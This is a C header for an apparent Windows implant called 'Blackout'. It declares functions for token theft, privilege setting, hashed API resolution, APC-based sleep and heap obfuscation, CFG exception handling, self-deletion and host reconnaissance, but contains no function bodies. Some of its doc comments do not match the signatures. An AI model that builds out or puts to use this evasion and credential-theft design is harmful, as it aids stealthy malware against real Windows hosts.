#ifndef BLACKOUT_UTILS_H
#define BLACKOUT_UTILS_H

#include <windows.h>
#include <native.h>
#include <winhttp.h>

ULONG HashString(
    _In_ PVOID  String,
    _In_ SIZE_T Length
);

/*!
 * @brief
 * Retrieves the username associated with a specified access token.
 * 
 * @param TokenHandle
 * Handle to the access token from which to retrieve the username. This handle must have the TOKEN_QUERY access right.
 * 
 * @param UserName
 * Pointer to a buffer that will receive the username string. The caller is responsible for ensuring this buffer is properly allocated.
 * 
 * @param UserNameBuffLen
 * Pointer to a variable that specifies the size of the `UserName` buffer on input, and receives the required size on output if the buffer is too small.
 * 
 * @return
 * This function does not return a value.
 * 
 * @retval ERROR_SUCCESS if the username is retrieved successfully.
 * @retval ERROR_INSUFFICIENT_BUFFER if the provided buffer is too small, with the required size stored in `UserNameBuffLen`.
 * @retval ERROR_INVALID_HANDLE if the provided token handle is not valid.
 * 
 * @note
 * Ensure that `TokenHandle` has the TOKEN_QUERY permission to allow querying user information.
 * 
 * @warning
 * The caller is responsible for freeing any memory allocated for the username buffer after use to avoid memory leaks.
 */
VOID GetTokenUserA( 
    _In_  HANDLE  TokenHandle,
    _Out_ PSTR   *UserName,
    _Out_ DWORD  *UserNameBuffLen
);

BOOL TokenSteal(
    _In_ DWORD   ProcessId,
    _In_ HANDLE *TokenHandle
);

BOOL SetPrivilege(
    _In_ HANDLE hToken,
    _In_ LPCSTR PrivilegeName
);

/*!
 * @brief
 * Get value of the specified environment variable
 * 
 * @param EnvVar
 * Target environment variable to get value
 * 
 * @return
 * Return target value
 */
PWSTR GetEnvVar( 
    _In_ PWSTR EnvVar 
);

/*!
 * @brief
 * kill target process
 * 
 * @param ProcessId
 * process id to kill
 */
BOOL KillProcess(
	_In_ DWORD ProcessId
);

/*!
 * @brief
 * retrieves the infos of the process
 *
 * @param FullPath
 * full path of the process
 * 
 * @param BaseName
 * process name.
 * 
 * @param CmdLine
 * command line from the process
 */
VOID GetProcessInfo(
	_Out_     PWSTR *FullPath,
	_Out_     PWSTR *BaseName,
	_Out_     PWSTR *CmdLine
);

/*!
 * @brief 
 * get informations from the target computer
 *
 * @param ProcessArch
 * number representing the architecture, needs to be manipulated
 * 
 * @param ProcessType
 * number representing the type of process, needs to be manipulated
 * 
 * @param ProductType
 * number representing the product type, needs to be manipulated
 */
VOID GetComputerInfo(
	_Out_ WORD  *ProcessArch,
	_Out_ DWORD *ProcessType,
	_Out_ DWORD *ProductType,
    _Out_ PSTR  *IpAddress
);

/*!
 * @brief
 *  resolve module from peb
 *
 * @param Buffer
 *  either string or hash
 *
 * @param Hashed
 *  is the Buffer a hash value
 *
 * @return
 *  module base pointer
 */
PVOID LdrModuleAddr(
    _In_ ULONG Hash
);

/*!
 * @brief
 * resolve export function from module
 * 
 * @param BaseModule
 * module base address to get export function
 * 
 * @param FuncHash
 * hash of the function
 * 
 * @return
 * function base address 
 */
PVOID LdrFuncAddr(
    _In_ PVOID Module,
    _In_ ULONG Function
);

/*!
 * @brief 
 * initialize implant configs
 */
VOID BlackoutInit(
    PVOID Param
);

/*!
 * @brief
 * implant entrypoint
 * 
 * @param Param
 * param passed to implant from caller
 */
VOID BlackoutMain(
    _In_ PVOID Param
);

VOID SleepMain(
    DWORD SleepTime
);

/*!
 * @brief
 * foliage sleep obfuscation technique APC based
 * 
 * @param SleepTime
 * time to sleeping
 */
VOID FoliageObf( 
    _In_ DWORD SleepTime
);

BOOL HeapObf( 
    void
);

BOOL HeapDeobf( 
    void
);

/*!
 * @brief
 * check if CFG is enabled
 * 
 * @return
 * return boolean value, TRUE if cfg enabled and FALSE if CFG disabled
 */
BOOL CfgCheckEnabled(
    VOID
);

VOID CfgAddressAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
);

/*!
 * @brief
 *  add private memory to CFG exception list.
 * 
 * @param hProcess
 *  target process handle 
 * 
 * @param Addr
 *  private memory address to add to the cfg list
 *
 * @param Size
 *  private memory address size to add to the cfg list
 */
VOID CfgPrivateAddressAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
);

EXTERN_C VOID volatile ___chkstk_ms(
        VOID
);

BOOL SelfDeletion(
    void
);

/*============================[ Memory ]============================*/

PVOID MemSet( void* Destination, int Value, size_t Size );
PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length );
void  MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size );

/*============================[ Strings ]============================*/

SIZE_T WCharStringToCharString( _Inout_ PCHAR Destination, _In_ PWCHAR Source, _In_ SIZE_T MaximumAllowed );
SIZE_T CharStringToWCharString( _Inout_ PWCHAR Destination, _In_ PCHAR Source, SIZE_T _In_ MaximumAllowed );
SIZE_T StringLengthA(_In_ LPCSTR String);
void   InitUnicodeString( _Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer);
SIZE_T StringLengthW(_In_ LPCWSTR String);
INT    StringCompareA(_In_ LPCSTR String1, _In_ LPCSTR String2);
INT    StringCompareW(_In_ LPCWSTR String1, _In_ LPCWSTR String2);
void   toLowerCaseChar(char* str);
WCHAR  toLowerCaseWchar(WCHAR ch);
PCHAR  StringCopyA(_Inout_ PCHAR String1, _In_ LPCSTR String2);
PWCHAR StringCopyW(_Inout_ PWCHAR String1, _In_ LPCWSTR String2);
WCHAR  StringConcatW(_Inout_ PWCHAR String, _In_ LPCWSTR String2);
PCHAR  StringConcatA(_Inout_ PCHAR String, _In_ LPCSTR String2);
BOOL   IsStringEqual ( _In_ LPCWSTR Str1, _In_ LPCWSTR Str2 );
void   InitUnicodeString( _Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer);
ULONG  Random32();
ULONG  RandomNumber32( VOID );

#endif //BLACKOUT_UTILS_H
